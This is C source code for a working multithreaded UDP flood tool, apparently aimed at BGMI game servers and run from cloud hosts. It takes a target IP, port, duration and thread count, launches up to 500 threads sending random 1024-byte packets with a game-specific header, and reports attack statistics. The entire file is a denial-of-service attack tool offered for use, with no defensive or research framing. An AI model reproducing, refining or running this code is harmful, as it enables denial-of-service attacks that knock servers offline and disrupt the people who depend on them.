#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>

#define PACKET_SIZE 1024
#define MAX_THREADS 500

volatile int stop_attack = 0;

void handler(int sig) {
    stop_attack = 1;
    printf("\n[!] Attack stopped\n");
}

void banner() {
    printf("\n");
    printf("╔════════════════════════════════════════════╗\n");
    printf("║     PRIME ONYX - CLOUDWAYS EDITION         ║\n");
    printf("║        BGMI UDP FLOOD READY                ║\n");
    printf("╚════════════════════════════════════════════╝\n");
}

void usage() {
    banner();
    printf("\nUsage: ./bgmi <IP> <PORT> <TIME> <THREADS>\n");
    printf("Example: ./bgmi 1.1.1.1 80 300 500\n");
    printf("Max Time: 300 seconds\n");
    printf("Max Threads: 500 (Cloudways limit)\n\n");
    exit(1);
}

typedef struct {
    char ip[16];
    int port;
    int duration;
    unsigned long long count;
} attack_data;

void* flood(void* arg) {
    attack_data* data = (attack_data*)arg;
    int sock;
    struct sockaddr_in addr;
    char packet[PACKET_SIZE];
    time_t end;
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    
    // Cloudways optimization
    int buf = 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
    
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(data->port);
    addr.sin_addr.s_addr = inet_addr(data->ip);
    
    // Random payload
    for (int i = 0; i < PACKET_SIZE; i++) {
        packet[i] = rand() % 256;
    }
    // BGMI header
    packet[0] = 0x16;
    packet[1] = 0x9e;
    packet[2] = 0x56;
    packet[3] = 0xc2;
    
    end = time(NULL) + data->duration;
    data->count = 0;
    
    while (time(NULL) < end && !stop_attack) {
        if (sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            usleep(100);
        } else {
            data->count++;
        }
    }
    
    close(sock);
    return NULL;
}

int main(int argc, char* argv[]) {
    signal(SIGINT, handler);
    
    if (argc != 5) usage();
    
    char* ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    
    if (port < 1 || port > 65535) {
        printf("❌ Invalid port\n");
        return 1;
    }
    if (duration < 1 || duration > 300) {
        printf("❌ Invalid duration (1-300 seconds)\n");
        return 1;
    }
    if (threads < 1 || threads > MAX_THREADS) {
        printf("❌ Invalid threads (1-%d)\n", MAX_THREADS);
        return 1;
    }
    
    banner();
    printf("\n[+] Target: %s:%d", ip, port);
    printf("\n[+] Duration: %d seconds", duration);
    printf("\n[+] Threads: %d\n\n", threads);
    
    pthread_t tids[threads];
    attack_data data[threads];
    
    for (int i = 0; i < threads; i++) {
        strcpy(data[i].ip, ip);
        data[i].port = port;
        data[i].duration = duration;
        data[i].count = 0;
        pthread_create(&tids[i], NULL, flood, &data[i]);
    }
    
    printf("[+] All %d threads launched!\n", threads);
    printf("[+] Attack running for %d seconds...\n\n", duration);
    
    // Progress
    for (int e = 30; e <= duration && !stop_attack; e += 30) {
        sleep(30);
        if (!stop_attack) {
            printf("[⏳] %d/%d sec (%d min left)\n", e, duration, (duration - e)/60);
        }
    }
    
    for (int i = 0; i < threads; i++) {
        pthread_join(tids[i], NULL);
    }
    
    unsigned long long total = 0;
    for (int i = 0; i < threads; i++) {
        total += data[i].count;
    }
    
    printf("\n╔════════════════════════════════════════════╗\n");
    printf("║              ATTACK FINISHED               ║\n");
    printf("╠════════════════════════════════════════════╣\n");
    printf("║ Total Packets: %llu\n", total);
    printf("║ Avg Speed    : %llu pps\n", total / duration);
    printf("╚════════════════════════════════════════════╝\n");
    
    return 0;
}
